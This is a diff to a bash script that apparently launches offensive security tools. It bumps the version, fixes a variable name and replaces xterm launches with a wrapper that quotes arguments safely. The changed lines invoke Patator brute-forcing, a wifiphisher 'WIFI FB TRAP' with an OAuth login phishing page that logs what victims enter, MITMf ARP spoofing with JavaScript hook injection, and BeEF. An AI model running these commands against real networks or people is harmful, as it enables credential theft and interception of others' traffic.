@@ -35,7 +35,7 @@
 ###############################################################################
 
 # set -x
-VERSION=2.2.7
+VERSION=2.2.8
 LSCRIPT_GITHUB_USER="Mkadir1999"
 LSCRIPT_GITHUB_REPO="lazyscript"
 LSCRIPT_GITHUB_BRANCH="main"
@@ -2336,9 +2336,8 @@ EOF
 		continue
 	else
 		cd /root/patator
-		export XTP
-		xterm -T "INSTRUCTIONS" -hold -e "bash -c 'echo ---------------------------------------; echo start with: python patator.py $XPT; echo ---------------------------------------; python patator.py $XPT; exec bash'" & disown
-		xterm -T "PATATOR" -hold & disown
+		export XPT
+		lscript_term --title "PATATOR" --hold --disown -- bash -c "echo 'start with: python patator.py $(printf '%q' "$XPT")'; python patator.py $(printf '%q' "$XPT"); exec bash"
 	fi
 done
 }
@@ -8205,7 +8204,7 @@ function wififb
 	ESSIDAP=$wifiname
 	export ESSIDAP
 	export wififbfile
-	xterm -hold -geometry 160x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --noextensions --essid "$ESSIDAP" -p oauth-login -kB --logging | tee $wififbfile; exec bash' & disown 
+	lscript_term --geometry 160x60+9999+999999 --title "WIFI FB TRAP" --hold --disown -- bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --noextensions --essid "$ESSIDAP" -p oauth-login -kB --logging | tee "$wififbfile"; exec bash'
 }
 function wififb_pass
 {
@@ -10005,9 +10004,9 @@ function browser_exploiting
 							clear
 							if [[ "$wholenetwork" == 0 ]]
 							then
-								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+								lscript_term --title "MITMf" --geometry 80x15+9999+9999 --hold --disown -- bash -c "python mitmf.py -i $(printf '%q' "$mitmfint") --spoof --arp --gateway $(printf '%q' "$mitmfgate") --target $(printf '%q' "$TAR") --hsts --inject --js-url $(printf '%q' "$mitmfhook"); exec bash"
 							else
-								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
+								lscript_term --title "MITMf" --geometry 80x15+9999+9999 --hold --disown -- bash -c "python mitmf.py -i $(printf '%q' "$mitmfint") --spoof --arp --gateway $(printf '%q' "$mitmfgate") --hsts --inject --js-url $(printf '%q' "$mitmfhook"); exec bash"
 							fi
 							cd
 						else
@@ -10046,7 +10045,7 @@ function browser_exploiting
 			fi
 			cd /usr/share/beef-xss 
 			beefrunning=1
-			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
+			lscript_term --title "BEEF" --geometry 80x15+9999+0 --hold --disown -- bash -c './beef; exec bash'
 			cd
 		elif [[ "$AEB" = 0 ]]
 		then
@@ -10440,7 +10439,7 @@ function main_options
 			echo -e ""$RS"Interface "$iftopint" was not found"
 			sleep 2
 		else
-			xterm -hold -T "Iftop on $iftopint" -e "iftop -n -i $iftopint -b" & disown
+			lscript_term --title "Iftop on $iftopint" --hold --disown -- iftop -n -i "$iftopint" -b
 			BACKL=1
 		fi
 	elif [[ "$YORNAA" = "21" ]]
@@ -12379,7 +12378,7 @@ function profile_load
 		gitlink="https://github.com/Mr-Un1k0d3r/UniByAv.git"
 		echo -e ""$RS"UniByAv is no longer maintained."$CE""
 		echo -e "It is recommended to use Veil or TheFatRat instead (both already available in this menu)."
-		return 0
+		return 1
 	}
 	function install_demiguise
 	{
